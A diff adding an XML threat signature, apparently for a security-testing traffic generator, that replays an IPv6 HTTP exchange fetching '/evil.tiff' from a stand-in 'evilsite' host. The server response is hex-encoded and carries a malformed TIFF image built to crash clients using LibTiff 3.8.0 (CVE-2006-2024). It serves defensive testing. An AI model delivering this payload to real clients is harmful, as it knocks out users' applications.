@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="LibTiff Denial of Service Vulnerability (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a malicious tiff image file in a HTTP server response meant to crash any client application that uses the LibTiff image processing library. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="LibTiff"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="LibTiff_LibTiff"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="LibTiff_LibTiff_LibTiff_3.8.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://bugzilla.remotesensing.org/show_bug.cgi?id=1102"/>
+    <CVEID display="true" value="2006-2024"/>
+    <bugtraqID display="true" value="17730"/>
+    <OSVDB display="true" value="25018"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="46cad14b0c9cbeb987efb22a613f0394"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211991019"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1173915646" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F6576696C2E7469666620485454502F312E310D0A486F73743A207777772E6576696C736974652E636F6D0D0A557365722D4167656E743A204D6F7A696C6C612F352E302046697265666F782F312E362E360D0A4163636570743A20696D6167652F706E672C2A2F2A3B713D302E354163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174654163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203331204D617920323030362030323A30373A353020474D540D0A5365727665723A204170616368650D0A4C6173742D4D6F6469666965643A205765642C203331204D617920323030362030323A30333A303020474D540D0A455461673A20223562343636372D3136632D6633373166643030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203336340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D39390D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20696D6167652F746966660D0A0D0A49492A2054202020FF3E3EFFCF3E9EFF3E3EFF6E3EFFFFFFCF3E9FFF3E3EFF6E3EFFFF3E6EFF9FFFDE3EFF6E3EFFFF3E6EFF9F3EFF3EFF6E3EFFFF3E6EFF9F3EFFFF3ECF3EFFFF3E6EFF9E3EFFFF3ECFFF3E3E201120FE2004203E2020202020202020010320012020200520202001010320012020200520202002010320032020202601202003010320012020200120202006010341016920200220202054010220182020202C0120200E010220182020204401202011010420A22020200820202012010320012020200120202015010320012020200320202016010320012020204020202017010420012020204B2020201A010520012020205C0120201B01052001202020640120201C0103200120202001202020280103200120202002202020202020200820082008202F686F6D502F74617669732C2F696E7075742E7469666620544156495F4F405344462E4C4F4E452B5441522E4F4E472020202048202020012020204820202001" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
